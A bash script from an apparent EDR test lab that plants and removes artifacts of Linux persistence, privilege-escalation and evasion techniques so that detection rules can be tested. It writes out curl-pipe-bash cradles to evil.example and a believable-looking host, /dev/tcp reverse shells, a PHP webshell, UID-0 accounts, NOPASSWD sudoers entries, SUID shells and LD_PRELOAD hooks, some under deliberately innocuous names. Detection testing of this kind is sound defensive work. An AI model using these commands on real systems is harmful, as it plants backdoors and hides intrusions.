#!/usr/bin/env bash
# bladedr poligon — technique dispatcher.
#
#   techniques.sh <technique-id> <plant|clean> <obvious|stealthy>
#
# Each technique creates (plant) or removes (clean) the agentless ARTIFACT of one
# EDR-T technique — a file, config, account or key that a bladedr rule detects. No
# real malware: we reproduce the artifact at rest, not a working implant.
#
# Two variants share the SAME structural trigger (e.g. "SUID binary in a writable
# dir", "cron line with a curl|bash cradle") and differ only in cosmetic naming:
#   obvious  — bright PoC names (/tmp/.x/evil, "backdoor", rootkit-ish)
#   stealthy — believable names (/var/lib caches, node-metrics, datadog-ish)
# Training on both teaches the model the structure, not the names.
set -u

ID="${1:?technique id}"; ACT="${2:?plant|clean}"; VAR="${3:-obvious}"

obvious() { [ "$VAR" = obvious ]; }
# pick OBVIOUS STEALTHY -> echoes the right one for the current variant
pick() { if obvious; then printf '%s' "$1"; else printf '%s' "$2"; fi; }

CRADLE="$(pick 'curl http://evil.example/x | bash' 'curl -fsSL https://cdn.node-metrics.io/setup | bash')"

# LABDIR holds the helper/probe (set by the orchestrator; /lab in the container,
# /tmp/bladedr-lab over SSH). SUDO is empty as root (container) and "sudo -n" for a
# non-root SSH target with passwordless sudo, so privileged techniques work on both.
LABDIR="${LABDIR:-/lab}"
RUNDIR="$LABDIR/run"; mkdir -p "$RUNDIR"
# As root (container) privileged ops run directly. As a non-root SSH target they go
# through sudo: passwordless if available, else sudo -S reading BLADEDR_SUDO_PW from
# stdin (per-command — nothing persistent is changed on the host).
SUDO=""
if [ "$(id -u)" -ne 0 ]; then SUDO=lab_sudo; fi
lab_sudo() {
  if sudo -n true 2>/dev/null; then sudo -n "$@"
  else printf '%s\n' "${BLADEDR_SUDO_PW:-}" | sudo -S "$@" 2>/dev/null; fi
}

# Runtime techniques need a LIVE process during the scan. bg starts one detached
# (survives this exec session) and records its PID; kill_pid stops it.
bg() { local pf="$1"; shift; nohup "$@" >/dev/null 2>&1 </dev/null & echo $! > "$pf"; sleep 0.6; }
kill_pid() { [ -f "$1" ] && kill "$(cat "$1")" 2>/dev/null; rm -f "$1"; true; }

# A plant that overwrites a file the host may already have (sshd_config, nsswitch.conf,
# root's authorized_keys...) saves it first, and its clean puts it back; removing the file
# instead would delete the host's own on an SSH target. The copies live outside LABDIR,
# which teardown removes, so a run that dies between plant and clean leaves the originals
# recoverable in ORIGDIR. A live socket can't be copied back, so planting over one (a real
# docker.sock) is refused instead.
ORIGDIR="${BLADEDR_LAB_ORIG:-/var/tmp/bladedr-lab-orig}"
save() {
  for f in "$@"; do
    b="$ORIGDIR$f"
    { [ -e "$b" ] || [ -L "$b" ] || [ -e "$b.absent" ]; } && continue  # first save wins
    [ -S "$f" ] && { echo "refusing to plant over live socket $f" >&2; exit 3; }
    mkdir -p -m 0700 "$ORIGDIR" && mkdir -p "$(dirname "$b")" || exit 3
    if [ -e "$f" ] || [ -L "$f" ]; then cp -a "$f" "$b" || exit 3; else : > "$b.absent"; fi
  done
}
restore() {
  for f in "$@"; do
    b="$ORIGDIR$f"
    if [ -e "$b.absent" ]; then rm -rf "$f"; rm -f "$b.absent"
    elif [ -e "$b" ] || [ -L "$b" ]; then rm -rf "$f"; mv "$b" "$f"
    fi  # nothing saved: this run never planted over f, so leave it alone
  done
  true
}

case "$ID:$ACT" in

# ---- TA0003 Persistence --------------------------------------------------------
cron-cradle:plant)
  mkdir -p /etc/cron.d
  f="$(pick /etc/cron.d/evil /etc/cron.d/node-metrics)"
  printf '*/5 * * * * root %s\n' "$CRADLE" > "$f" ;;
cron-cradle:clean) rm -f /etc/cron.d/evil /etc/cron.d/node-metrics ;;

systemd-service:plant)
  f="$(pick /etc/systemd/system/evil.service /etc/systemd/system/node-metrics.service)"
  exe="$(pick /tmp/.x/payload /var/tmp/.cache/agent)"
  printf '[Service]\nExecStart=%s --daemon\n[Install]\nWantedBy=multi-user.target\n' "$exe" > "$f" ;;
systemd-service:clean) rm -f /etc/systemd/system/evil.service /etc/systemd/system/node-metrics.service ;;

systemd-timer:plant)
  base="$(pick evil node-metrics)"; exe="$(pick /tmp/.x/payload /var/tmp/.cache/agent)"
  printf '[Service]\nExecStart=%s --tick\n' "$exe" > "/etc/systemd/system/$base.service"
  printf '[Timer]\nOnCalendar=*-*-* *:00:00\n[Install]\nWantedBy=timers.target\n' > "/etc/systemd/system/$base.timer" ;;
systemd-timer:clean) rm -f /etc/systemd/system/evil.timer /etc/systemd/system/evil.service \
                           /etc/systemd/system/node-metrics.timer /etc/systemd/system/node-metrics.service ;;

ssh-service-key:plant)
  d=/home/svc-metrics/.ssh; mkdir -p "$d"
  printf 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI%s implant\n' "$(pick EVIL000000000000000000000000000000000000000 RealLookingKeyMaterial0000000000000000000000)" > "$d/authorized_keys"
  chown -R svc-metrics:svc-metrics "$d" 2>/dev/null || true; chmod 600 "$d/authorized_keys" ;;
ssh-service-key:clean) rm -rf /home/svc-metrics/.ssh ;;

authorized-keys-option:plant)
  save /root/.ssh/authorized_keys
  d=/root/.ssh; mkdir -p "$d"; chmod 700 "$d"
  opt="$(pick 'environment="LD_PRELOAD=/tmp/.x/evil.so"' 'command="/usr/local/sbin/healthcheck",environment="LD_PRELOAD=/var/lib/.cache/a.so"')"
  printf '%s ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI%s admin\n' "$opt" "$(pick OPT0000000000000000000000000000000000000000 OptRealKeyMaterial000000000000000000000000000)" > "$d/authorized_keys"
  chmod 600 "$d/authorized_keys" ;;
authorized-keys-option:clean) restore /root/.ssh/authorized_keys ;;

udev-run:plant)
  f="$(pick /etc/udev/rules.d/99-evil.rules /etc/udev/rules.d/70-node-metrics.rules)"
  # both run from a writable dir (the structural trigger); only the name differs
  run="$(pick /tmp/.x/run.sh /var/tmp/.udev-helper/agent.sh)"; mkdir -p /etc/udev/rules.d
  printf 'ACTION=="add", SUBSYSTEM=="block", RUN+="%s"\n' "$run" > "$f" ;;
udev-run:clean) rm -f /etc/udev/rules.d/99-evil.rules /etc/udev/rules.d/70-node-metrics.rules ;;

shell-rc:plant)
  save /root/.bashrc
  printf "\nalias ls='ls | grep -v %s'\n" "$(pick evil .cache)" >> /root/.bashrc ;;
shell-rc:clean) restore /root/.bashrc ;;

python-pth:plant)
  f="$(pick /usr/lib/python3.11/site-packages/evil.pth /usr/lib/python3.11/site-packages/sitecustomize_metrics.pth)"
  printf "import os; os.system('%s')\n" "$(pick 'id' '/usr/local/bin/agent --report')" > "$f" ;;
python-pth:clean) rm -f /usr/lib/python3.11/site-packages/evil.pth /usr/lib/python3.11/site-packages/sitecustomize_metrics.pth ;;

ld-preload:plant)
  save /etc/ld.so.preload
  printf '%s\n' "$(pick /tmp/.x/evil.so /var/lib/.cache/libmetrics.so)" > /etc/ld.so.preload ;;
ld-preload:clean) restore /etc/ld.so.preload ;;

apt-hook:plant)
  f="$(pick /etc/apt/apt.conf.d/99evil /etc/apt/apt.conf.d/99-node-metrics)"; mkdir -p /etc/apt/apt.conf.d
  printf 'DPkg::Pre-Invoke {"%s";};\n' "$CRADLE" > "$f" ;;
apt-hook:clean) rm -f /etc/apt/apt.conf.d/99evil /etc/apt/apt.conf.d/99-node-metrics ;;

pam-backdoor:plant)
  mkdir -p /etc/pam.d
  mod="$(pick /tmp/.x/pam_evil.so /var/lib/.cache/pam_metrics.so)"
  printf 'auth optional %s\n' "$mod" > /etc/pam.d/sshd-poligon ;;
pam-backdoor:clean) rm -f /etc/pam.d/sshd-poligon ;;

dnf-plugin:plant)
  d=/usr/lib/python3/dist-packages/dnf-plugins; mkdir -p "$d"
  f="$(pick "$d/evil.py" "$d/metrics.py")"
  printf 'import os\n' > "$f"; chmod 666 "$f" ;;   # world-writable plugin
dnf-plugin:clean) d=/usr/lib/python3/dist-packages/dnf-plugins; rm -f "$d/evil.py" "$d/metrics.py"; rmdir "$d" 2>/dev/null; true ;;

# ---- TA0004 Privilege Escalation ----------------------------------------------
uid0-account:plant)
  name="$(pick toor svc-sync)"
  groupadd -g 0 -o "$name" 2>/dev/null || true
  useradd -o -u 0 -g 0 -M -s /bin/bash "$name" 2>/dev/null || \
    printf '%s:x:0:0::/root:/bin/bash\n' "$name" >> /etc/passwd ;;
uid0-account:clean)
  # userdel refuses a uid-0 account while root has processes, so remove it by hand from
  # every file useradd/groupadd wrote — passwd alone left a gid-0 group behind.
  for f in /etc/passwd /etc/shadow /etc/group /etc/gshadow /etc/subuid /etc/subgid; do
    [ -f "$f" ] && sed -i '/^toor:/d;/^svc-sync:/d' "$f"
  done; true ;;

sudoers:plant)
  mkdir -p /etc/sudoers.d
  f="$(pick /etc/sudoers.d/evil /etc/sudoers.d/deploy-ci)"
  printf '%s ALL=(ALL) NOPASSWD: ALL\n' "$(pick baduser deploy)" > "$f"; chmod 440 "$f" ;;
sudoers:clean) rm -f /etc/sudoers.d/evil /etc/sudoers.d/deploy-ci ;;

suid-writable:plant)
  f="$(pick /tmp/.x/rootshell /var/tmp/.fontcache/upd)"; mkdir -p "$(dirname "$f")"
  cp /bin/bash "$f" 2>/dev/null && chmod 4755 "$f" ;;
suid-writable:clean) rm -rf /tmp/.x/rootshell /var/tmp/.fontcache ;;

nfs-export:plant)
  save /etc/exports
  printf '%s *(rw,sync,no_root_squash)\n' "$(pick /srv/evil /srv/backups)" > /etc/exports ;;
nfs-export:clean) restore /etc/exports ;;

# ---- TA0005 Defense Evasion ---------------------------------------------------
hidden-exec:plant)
  f="$(pick /tmp/.x/.hidden /dev/shm/.systemd-private)"; mkdir -p "$(dirname "$f")"
  cp /bin/true "$f" 2>/dev/null && chmod 755 "$f" ;;
hidden-exec:clean) rm -rf /tmp/.x /dev/shm/.systemd-private ;;

history-disabled:plant)
  f="$(pick /root/.bashrc /home/deploy/.bashrc)"; save "$f"
  printf '\nexport HISTFILE=/dev/null\n' >> "$f" ;;
history-disabled:clean) restore /root/.bashrc /home/deploy/.bashrc ;;

log-symlink:plant)
  save /var/log/auth.log
  rm -f /var/log/auth.log; ln -s /dev/null /var/log/auth.log ;;
log-symlink:clean) restore /var/log/auth.log ;;

sysctl-hardening:plant)
  mkdir -p /etc/sysctl.d
  f="$(pick /etc/sysctl.d/99-evil.conf /etc/sysctl.d/60-node-tuning.conf)"
  printf 'kernel.yama.ptrace_scope = 0\n' > "$f" ;;
sysctl-hardening:clean) rm -f /etc/sysctl.d/99-evil.conf /etc/sysctl.d/60-node-tuning.conf ;;

selinux-disabled:plant)
  save /etc/selinux/config; mkdir -p /etc/selinux
  printf 'SELINUX=%s\nSELINUXTYPE=targeted\n' "$(pick disabled permissive)" > /etc/selinux/config ;;
selinux-disabled:clean) restore /etc/selinux/config ;;

# ---- TA0003 Persistence (batch 2) ---------------------------------------------
cron-gtfobins:plant)
  mkdir -p /etc/cron.d
  f="$(pick /etc/cron.d/evilcmd /etc/cron.d/metrics-report)"
  printf "*/10 * * * * root %s\n" "$(pick "python3 -c 'import os'" "perl -e 'exec \"/bin/sh\"'")" > "$f" ;;
cron-gtfobins:clean) rm -f /etc/cron.d/evilcmd /etc/cron.d/metrics-report ;;

sshd-backdoor:plant)
  save /etc/ssh/sshd_config; mkdir -p /etc/ssh
  printf 'ForceCommand %s\n' "$(pick /tmp/.x/login.sh /var/tmp/.cache/login.sh)" > /etc/ssh/sshd_config ;;
sshd-backdoor:clean) restore /etc/ssh/sshd_config ;;

supervisor:plant)
  mkdir -p /etc/supervisor/conf.d
  f="$(pick /etc/supervisor/conf.d/evil.conf /etc/supervisor/conf.d/metrics.conf)"
  printf '[program:%s]\ncommand=%s --daemon\n' "$(pick evil metrics)" "$(pick /tmp/.x/run /var/tmp/.cache/run)" > "$f" ;;
supervisor:clean) rm -f /etc/supervisor/conf.d/evil.conf /etc/supervisor/conf.d/metrics.conf ;;

modprobe-cmd:plant)
  mkdir -p /etc/modprobe.d
  f="$(pick /etc/modprobe.d/evil.conf /etc/modprobe.d/node-tuning.conf)"
  printf 'install dummy %s\n' "$(pick /tmp/.x/run.sh /var/tmp/.cache/run.sh)" > "$f" ;;
modprobe-cmd:clean) rm -f /etc/modprobe.d/evil.conf /etc/modprobe.d/node-tuning.conf ;;

ldsoconf:plant)
  mkdir -p /etc/ld.so.conf.d "$(pick /tmp/lib /var/tmp/.cache/lib)"
  f="$(pick /etc/ld.so.conf.d/evil.conf /etc/ld.so.conf.d/node-libs.conf)"
  printf '%s\n' "$(pick /tmp/lib /var/tmp/.cache/lib)" > "$f" ;;
ldsoconf:clean) rm -f /etc/ld.so.conf.d/evil.conf /etc/ld.so.conf.d/node-libs.conf ;;

global-ldpreload:plant)
  save /etc/environment
  printf 'LD_PRELOAD=%s\n' "$(pick /tmp/.x/evil.so /var/tmp/.cache/lib.so)" >> /etc/environment ;;
global-ldpreload:clean) restore /etc/environment ;;

systemd-execpre:plant)
  f="$(pick /etc/systemd/system/evilpre.service /etc/systemd/system/node-pre.service)"
  printf '[Service]\nExecStartPre=%s\nExecStart=/usr/bin/true\n' "$(pick /tmp/.x/setup.sh /var/tmp/.cache/setup.sh)" > "$f" ;;
systemd-execpre:clean) rm -f /etc/systemd/system/evilpre.service /etc/systemd/system/node-pre.service ;;

systemd-revshell:plant)
  f="$(pick /etc/systemd/system/evilsh.service /etc/systemd/system/node-health.service)"
  printf "[Service]\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/%s/4444 0>&1'\n" "$(pick 10.0.0.1 198.51.100.7)" > "$f" ;;
systemd-revshell:clean) rm -f /etc/systemd/system/evilsh.service /etc/systemd/system/node-health.service ;;

startup-cradle:plant)
  mkdir -p /etc/profile.d
  f="$(pick /etc/profile.d/00-evil.sh /etc/profile.d/00-node-metrics.sh)"
  printf '%s\n' "$CRADLE" > "$f" ;;
startup-cradle:clean) rm -f /etc/profile.d/00-evil.sh /etc/profile.d/00-node-metrics.sh ;;

at-cradle:plant)
  mkdir -p /var/spool/cron/atjobs
  f="$(pick /var/spool/cron/atjobs/a0001 /var/spool/cron/atjobs/a0002)"
  printf '#!/bin/sh\n%s\n' "$CRADLE" > "$f" ;;
at-cradle:clean) rm -f /var/spool/cron/atjobs/a0001 /var/spool/cron/atjobs/a0002 ;;

initramfs:plant)
  mkdir -p /etc/initramfs-tools/hooks
  f="$(pick /etc/initramfs-tools/hooks/99-evil /etc/initramfs-tools/hooks/zz-node-metrics)"
  printf '#!/bin/sh\nbash -i >& /dev/tcp/%s/4444 0>&1\n' "$(pick 10.0.0.1 198.51.100.7)" > "$f" ;;
initramfs:clean) rm -f /etc/initramfs-tools/hooks/99-evil /etc/initramfs-tools/hooks/zz-node-metrics ;;

xdg-autostart:plant)
  mkdir -p /etc/xdg/autostart
  f="$(pick /etc/xdg/autostart/evil.desktop /etc/xdg/autostart/node-metrics.desktop)"
  printf '[Desktop Entry]\nType=Application\nExec=%s\n' "$(pick /tmp/.x/run.sh /var/tmp/.cache/run.sh)" > "$f" ;;
xdg-autostart:clean) rm -f /etc/xdg/autostart/evil.desktop /etc/xdg/autostart/node-metrics.desktop ;;

ssh-localcommand:plant)
  save /root/.ssh/config; mkdir -p /root/.ssh; chmod 700 /root/.ssh
  printf 'Host *\n  PermitLocalCommand yes\n  LocalCommand %s\n' "$(pick /tmp/.x/run.sh /var/tmp/.cache/run.sh)" > /root/.ssh/config ;;
ssh-localcommand:clean) restore /root/.ssh/config ;;

nsswitch:plant)
  save /etc/nsswitch.conf
  printf 'passwd: files %s\ngroup: files\n' "$(pick backdoor metrics)" > /etc/nsswitch.conf ;;
nsswitch:clean) restore /etc/nsswitch.conf ;;

pam-exec:plant)
  mkdir -p /etc/pam.d
  printf 'auth optional pam_exec.so expose_authtok %s\n' "$(pick /tmp/.x/log.sh /var/tmp/.cache/log.sh)" > /etc/pam.d/sshd-poligon2 ;;
pam-exec:clean) rm -f /etc/pam.d/sshd-poligon2 ;;

# ---- TA0003/web + supply-chain ------------------------------------------------
webshell:plant)
  mkdir -p /var/www/html
  f="$(pick /var/www/html/shell.php /var/www/html/uploads_handler.php)"; save "$f"
  printf '<?php system($_GET["cmd"]); ?>\n' > "$f" ;;
webshell:clean) restore /var/www/html/shell.php /var/www/html/uploads_handler.php ;;

web-module:plant)
  mkdir -p /etc/apache2/mods-enabled
  f="$(pick /etc/apache2/mods-enabled/evil.load /etc/apache2/mods-enabled/metrics.load)"
  printf 'LoadModule %s_module %s\n' "$(pick evil metrics)" "$(pick /tmp/.x/mod.so /var/tmp/.cache/mod.so)" > "$f" ;;
web-module:clean) rm -f /etc/apache2/mods-enabled/evil.load /etc/apache2/mods-enabled/metrics.load ;;

apt-unverified:plant)
  mkdir -p /etc/apt/sources.list.d
  f="$(pick /etc/apt/sources.list.d/evil.list /etc/apt/sources.list.d/node-metrics.list)"
  printf 'deb [trusted=yes] http://%s/debian ./\n' "$(pick evil.example cdn.node-metrics.io)" > "$f" ;;
apt-unverified:clean) rm -f /etc/apt/sources.list.d/evil.list /etc/apt/sources.list.d/node-metrics.list ;;

# ---- TA0004 Privilege Escalation (batch 2) ------------------------------------
passwordless:plant)
  name="$(pick ghost svc-backup)"
  useradd -m "$name" 2>/dev/null || true; passwd -d "$name" >/dev/null 2>&1 || \
    sed -i "s|^$name:[^:]*:|$name::|" /etc/shadow 2>/dev/null || true ;;
passwordless:clean) userdel -r ghost 2>/dev/null; userdel -r svc-backup 2>/dev/null; true ;;

privgroup:plant)
  groupadd docker 2>/dev/null || true; usermod -aG docker svc-metrics 2>/dev/null || true ;;
privgroup:clean) gpasswd -d svc-metrics docker 2>/dev/null || true; true ;;

sudo-gtfobins:plant)
  mkdir -p /etc/sudoers.d
  f="$(pick /etc/sudoers.d/evilfind /etc/sudoers.d/deploy-find)"
  printf '%s ALL=(root) NOPASSWD: /usr/bin/find\n' "$(pick baduser deploy)" > "$f"; chmod 440 "$f" ;;
sudo-gtfobins:clean) rm -f /etc/sudoers.d/evilfind /etc/sudoers.d/deploy-find ;;

sudo-envkeep:plant)
  mkdir -p /etc/sudoers.d
  f="$(pick /etc/sudoers.d/evilenv /etc/sudoers.d/build-env)"
  printf 'Defaults env_keep += "LD_PRELOAD"\n' > "$f"; chmod 440 "$f" ;;
sudo-envkeep:clean) rm -f /etc/sudoers.d/evilenv /etc/sudoers.d/build-env ;;

cron-path-hijack:plant)
  mkdir -p /etc/cron.d
  f="$(pick /etc/cron.d/evilpath /etc/cron.d/metrics-path)"
  printf 'PATH=%s:/usr/bin\n*/5 * * * * root backup.sh\n' "$(pick /tmp/bin /var/tmp/.cache/bin)" > "$f" ;;
cron-path-hijack:clean) rm -f /etc/cron.d/evilpath /etc/cron.d/metrics-path ;;

# ---- TA0007 K8s node ----------------------------------------------------------
k8s-static-pod:plant)
  mkdir -p /etc/kubernetes/manifests
  f="$(pick /etc/kubernetes/manifests/evil.yaml /etc/kubernetes/manifests/node-exporter.yaml)"
  printf 'apiVersion: v1\nkind: Pod\nspec:\n  hostPID: true\n  containers:\n  - name: x\n    securityContext:\n      privileged: true\n    volumeMounts:\n    - mountPath: /host\n  volumes:\n  - hostPath:\n      path: /\n' > "$f" ;;
k8s-static-pod:clean) rm -f /etc/kubernetes/manifests/evil.yaml /etc/kubernetes/manifests/node-exporter.yaml ;;

k8s-kubeconfig:plant)
  save /etc/kubernetes/admin.conf; mkdir -p /etc/kubernetes
  printf 'apiVersion: v1\nkind: Config\nusers:\n- user:\n    client-key-data: SECRET\n    token: abc.def.ghi\n' > /etc/kubernetes/admin.conf
  chmod 644 /etc/kubernetes/admin.conf ;;
k8s-kubeconfig:clean) restore /etc/kubernetes/admin.conf ;;

# ---- Wave #1: RUNTIME techniques (live process/socket during the scan) --------
# $LABDIR/helper is the static runtime helper (poligon/helpers/runtime), copied in by
# the orchestrator. Spoofed-argv cases exec it under a fake argv via `exec -a`; it
# ignores unknown args and just sleeps, holding the spoofed identity.
deleted-binary:plant)
  b="$(pick /run/.x/payload /opt/.cache/agent)"; mkdir -p "$(dirname "$b")"
  cp $LABDIR/helper "$b"; bg "$RUNDIR/deleted-binary.pid" "$b"; rm -f "$b" ;;   # exe now deleted, proc lives
deleted-binary:clean) kill_pid "$RUNDIR/deleted-binary.pid"; rm -rf /run/.x /opt/.cache ;;

exec-world-writable:plant)
  # /dev/shm is mounted noexec in Docker, so the stealthy path uses /var/tmp (also
  # in the rule's writable set) to keep the structural trigger while staying execable.
  b="$(pick /tmp/.x/run /var/tmp/.cache/run)"; mkdir -p "$(dirname "$b")"
  cp $LABDIR/helper "$b"; bg "$RUNDIR/exec-ww.pid" "$b" ;;
exec-world-writable:clean) kill_pid "$RUNDIR/exec-ww.pid"; rm -rf /tmp/.x /var/tmp/.cache ;;

masquerade:plant)
  b="$(pick '/run/[kworker:9:0]' /run/kworker_helper)"
  cp $LABDIR/helper "$b"; bg "$RUNDIR/masquerade.pid" "$b" ;;   # comm = basename, contains "kworker"
masquerade:clean) kill_pid "$RUNDIR/masquerade.pid"; rm -f '/run/[kworker:9:0]' /run/kworker_helper ;;

empty-environ:plant)
  b=/run/svc-agent; cp $LABDIR/helper "$b"; bg "$RUNDIR/empty-environ.pid" env -i "$b" ;;
empty-environ:clean) kill_pid "$RUNDIR/empty-environ.pid"; rm -f /run/svc-agent ;;

revshell-proc:plant)
  rs="bash -i >& /dev/tcp/$(pick 10.0.0.1 198.51.100.7)/4444 0>&1"
  bg "$RUNDIR/revshell.pid" bash -c "exec -a '$rs' $LABDIR/helper" ;;   # cmdline = the reverse-shell string
revshell-proc:clean) kill_pid "$RUNDIR/revshell.pid" ;;

shell-child-of-web-server:plant)
  fake_srv="$(pick /tmp/.x/nginx /var/lib/node-metrics/nginx)"
  mkdir -p "$(dirname "$fake_srv")"; cp $LABDIR/helper "$fake_srv"
  # /proc/PID/exe of the shell child this spawns has the real OS parent/child
  # relationship the rule's snapshot.processes lookup needs — a spoofed argv
  # (exec -a, like revshell-proc above) wouldn't give the child the right PPID.
  bg "$RUNDIR/web-parent.pid" "$fake_srv" --spawn-shell ;;
shell-child-of-web-server:clean) kill_pid "$RUNDIR/web-parent.pid"; rm -rf /tmp/.x/nginx /var/lib/node-metrics ;;

ssh-tunnel-proc:plant)
  bg "$RUNDIR/ssh-tunnel.pid" bash -c "exec -a ssh $LABDIR/helper -fND $(pick 1080 9050) jump@10.0.0.5" ;;
ssh-tunnel-proc:clean) kill_pid "$RUNDIR/ssh-tunnel.pid" ;;

port-listener:plant)
  bg "$RUNDIR/listener.pid" $LABDIR/helper --listen "$(pick 4444 31337)" ;;
port-listener:clean) kill_pid "$RUNDIR/listener.pid" ;;

packet-sniffer:plant)
  bg "$RUNDIR/packet.pid" $LABDIR/helper --packet ;;
packet-sniffer:clean) kill_pid "$RUNDIR/packet.pid" ;;

weak-hash:plant)
  # A login account whose password is stored as an MD5-crypt (or 1970s DES) hash. The hash
  # string is a fixed placeholder: only its scheme is read, nothing here can authenticate.
  name="$(pick legacyadm svc-batch)"
  # Never delete an account that was there before the run: clean removes it by name.
  getent passwd "$name" >/dev/null && { echo "account $name already exists; refusing" >&2; exit 3; }
  useradd -m -s /bin/bash -p "$(pick '$1$poligon1$AAAAAAAAAAAAAAAAAAAAA.' 'abJnggxhB/yWI')" "$name" ;;
weak-hash:clean) userdel -r legacyadm 2>/dev/null; userdel -r svc-batch 2>/dev/null; true ;;

ssh-private-key-plain:plant)
  # An unencrypted private key left readable by others, as when a key is copied into a
  # home directory for a quick transfer and never removed. Generated here, never committed.
  mkdir -p /root/.ssh; chmod 700 /root/.ssh
  f="$(pick /root/.ssh/id_ed25519_leak /root/.ssh/backup_ed25519)"; save "$f"
  $LABDIR/helper --genkey "$f" && chmod 0644 "$f" ;;
ssh-private-key-plain:clean) restore /root/.ssh/id_ed25519_leak /root/.ssh/backup_ed25519 ;;

benign-ci-deploy-key:plant)
  # Deploy, backup and CI keys are stored without a passphrase on purpose: the job that
  # uses them runs unattended. Locked down properly (0600), it is still an unprotected key.
  mkdir -p /root/.ssh; chmod 700 /root/.ssh
  f="$(pick /root/.ssh/ci_deploy /root/.ssh/borg_backup)"; save "$f"
  $LABDIR/helper --genkey "$f" ;;
benign-ci-deploy-key:clean) restore /root/.ssh/ci_deploy /root/.ssh/borg_backup ;;

lib-writable:plant)
  f="$(pick /tmp/.x/libhook.so /var/tmp/.cache/libmetrics.so)"; mkdir -p "$(dirname "$f")"
  cp /bin/true "$f"; bg "$RUNDIR/lib-writable.pid" $LABDIR/helper --map "$f" ;;
lib-writable:clean) kill_pid "$RUNDIR/lib-writable.pid"; rm -rf /tmp/.x /var/tmp/.cache ;;

lib-deleted:plant)
  # Loaded, then unlinked: the process keeps the mapping, nothing is left to find on disk.
  # Not under /run or /dev/shm: those are mounted noexec on most distributions, which
  # refuses the executable mapping and leaves nothing for the probe to see.
  f="$(pick /var/tmp/.x/libhook.so /srv/.cache/libmetrics.so)"; mkdir -p "$(dirname "$f")"
  cp /bin/true "$f"; bg "$RUNDIR/lib-deleted.pid" $LABDIR/helper --map "$f"; rm -f "$f" ;;
lib-deleted:clean) kill_pid "$RUNDIR/lib-deleted.pid"; rm -rf /var/tmp/.x /srv/.cache ;;

preload-env:plant)
  # A static helper ignores LD_PRELOAD, but the variable stays in its environment, which
  # is what the rule reads — the same trace a dynamically linked victim would carry.
  bg "$RUNDIR/preload-env.pid" env "LD_PRELOAD=$(pick /tmp/.x/evil.so /var/tmp/.cache/libmetrics.so)" $LABDIR/helper ;;
preload-env:clean) kill_pid "$RUNDIR/preload-env.pid" ;;

miner-c2:plant)
  bg "$RUNDIR/miner.pid" $LABDIR/helper --connect "$(pick 3333 5555)" ;;
miner-c2:clean) kill_pid "$RUNDIR/miner.pid" ;;

memfd-exec:plant)
  bg "$RUNDIR/memfd.pid" $LABDIR/helper --memfd ;;
memfd-exec:clean) kill_pid "$RUNDIR/memfd.pid" ;;

# ---- Remaining agentless (caps / SUID / writable / supply-chain) --------------
file-cap:plant)
  f="$(pick /tmp/.x/capbin /var/tmp/.cache/capbin)"; mkdir -p "$(dirname "$f")"
  cp /bin/true "$f"; setcap cap_net_raw+ep "$f" 2>/dev/null || true ;;
file-cap:clean) rm -rf /tmp/.x /var/tmp/.cache ;;

dangerous-cap:plant)
  f="$(pick /usr/local/bin/evilcap /usr/local/bin/node-helper)"
  cp /bin/true "$f"; setcap cap_setuid+ep "$f" 2>/dev/null || true ;;
dangerous-cap:clean) rm -f /usr/local/bin/evilcap /usr/local/bin/node-helper ;;

suid-shell:plant)
  f="$(pick /usr/local/sbin/bash /usr/local/bin/bash)"; save "$f"  # basename must be a GTFOBins name
  cp /bin/bash "$f" 2>/dev/null && chmod 4755 "$f" ;;
suid-shell:clean) restore /usr/local/sbin/bash /usr/local/bin/bash ;;

writable-suid:plant)
  f="$(pick /usr/local/bin/evilupd /usr/local/bin/updhelper)"
  cp /bin/true "$f" && chmod 6777 "$f" ;;   # SUID/SGID + world-writable
writable-suid:clean) rm -f /usr/local/bin/evilupd /usr/local/bin/updhelper ;;

world-writable:plant) chmod o+w /etc/passwd ;;
world-writable:clean) chmod o-w /etc/passwd 2>/dev/null || true ;;

writable-persist:plant)
  f="$(pick /etc/systemd/system/evilw.service /etc/systemd/system/node-w.service)"
  printf '[Service]\nExecStart=/usr/bin/true\n' > "$f"; chmod o+w "$f" ;;
writable-persist:clean) rm -f /etc/systemd/system/evilw.service /etc/systemd/system/node-w.service ;;

login-shell:plant)
  useradd -M -s "$(pick /tmp/.x/sh /var/tmp/.cache/sh)" "$(pick evillogin svc-login)" 2>/dev/null || true ;;
login-shell:clean) userdel evillogin 2>/dev/null; userdel svc-login 2>/dev/null; true ;;

systemd-unit-ldpreload:plant)
  f="$(pick /etc/systemd/system/evilpl.service /etc/systemd/system/node-pl.service)"
  printf '[Service]\nEnvironment=LD_PRELOAD=%s\nExecStart=/usr/bin/true\n' "$(pick /tmp/.x/p.so /var/tmp/.cache/p.so)" > "$f" ;;
systemd-unit-ldpreload:clean) rm -f /etc/systemd/system/evilpl.service /etc/systemd/system/node-pl.service ;;

offensive-tool:plant)
  f="$(pick /tmp/.x/scan /var/tmp/.cache/tool)"; mkdir -p "$(dirname "$f")"
  printf 'package main\nimport _ "github.com/%s"\n' "$(pick jpillora/chisel fatedier/frp)" > "$f" ;;
offensive-tool:clean) rm -rf /tmp/.x /var/tmp/.cache ;;

liblzma-backdoor:plant)
  ver="$(pick 5.6.1 5.6.0)"; save /usr/lib/liblzma.so.5 "/usr/lib/liblzma.so.$ver"
  : > "/usr/lib/liblzma.so.$ver"; ln -sf "liblzma.so.$ver" /usr/lib/liblzma.so.5 ;;
liblzma-backdoor:clean) restore /usr/lib/liblzma.so.5 /usr/lib/liblzma.so.5.6.0 /usr/lib/liblzma.so.5.6.1 ;;

docker-socket:plant)
  save /run/docker.sock; mkdir -p /run; : > /run/docker.sock; chmod 0666 /run/docker.sock ;;
docker-socket:clean) restore /run/docker.sock ;;

# ---- Wave #2: privileged (need root + a real host; run on the SSH target) -----
# All reversible. $SUDO is "sudo -n" on a non-root target, empty as container root.
immutable-file:plant)
  # /etc/ld.so.preload is in the rule's sensitive set and is normally absent, so
  # creating + chattr+i then -i + rm is fully reversible and touches nothing real —
  # provided it really was absent, so a host that uses one is refused, not rewritten.
  [ -e /etc/ld.so.preload ] && { echo "/etc/ld.so.preload exists; refusing" >&2; exit 3; }
  $SUDO touch /etc/ld.so.preload && : > "$RUNDIR/ldpreload.ours"
  $SUDO chattr +i /etc/ld.so.preload 2>/dev/null || true ;;
immutable-file:clean)
  [ -f "$RUNDIR/ldpreload.ours" ] || exit 0
  $SUDO chattr -i /etc/ld.so.preload 2>/dev/null; $SUDO rm -f /etc/ld.so.preload; rm -f "$RUNDIR/ldpreload.ours"; true ;;

